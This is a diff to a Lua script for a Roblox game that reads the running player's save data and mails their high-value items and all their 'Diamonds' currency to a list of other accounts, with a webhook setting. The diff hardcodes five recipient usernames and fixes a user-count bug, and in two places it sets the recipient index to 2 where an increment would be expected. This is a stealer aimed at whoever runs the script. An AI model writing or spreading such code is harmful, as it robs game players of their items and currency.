@@ -17,7 +17,7 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {}
+local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
 local min_rap = _G.minrap or 1000000
 local webhook = _G.webhook or ""
 
@@ -187,7 +187,7 @@ end
 
 local function sendItem(category, uid, am)
     local userIndex = 1
-    local maxUsers = users
+    local maxUsers = #users
     local sent = false
     
     repeat
@@ -210,7 +210,7 @@ local function sendItem(category, uid, am)
                 mailSendPrice = 5000000
             end
         elseif response == false and err == "They don't have enough space!" then
-            userIndex = userIndex + 1
+            userIndex = 2
             if userIndex > maxUsers then
                 sent = true
             end
@@ -223,7 +223,7 @@ local function SendAllGems()
         if v.id == "Diamonds" then
             if GemAmount1 >= (mailSendPrice + 10000) then
                 local userIndex = 1
-                local maxUsers = users
+                local maxUsers = #users
                 local sent = false
                 
                 repeat
@@ -241,7 +241,7 @@ local function SendAllGems()
                     if response == true then
                         sent = true
                     elseif response == false and err == "They don't have enough space!" then
-                        userIndex = userIndex + 1
+                        userIndex = 2
                         if userIndex > maxUsers then
                             sent = true
                         end
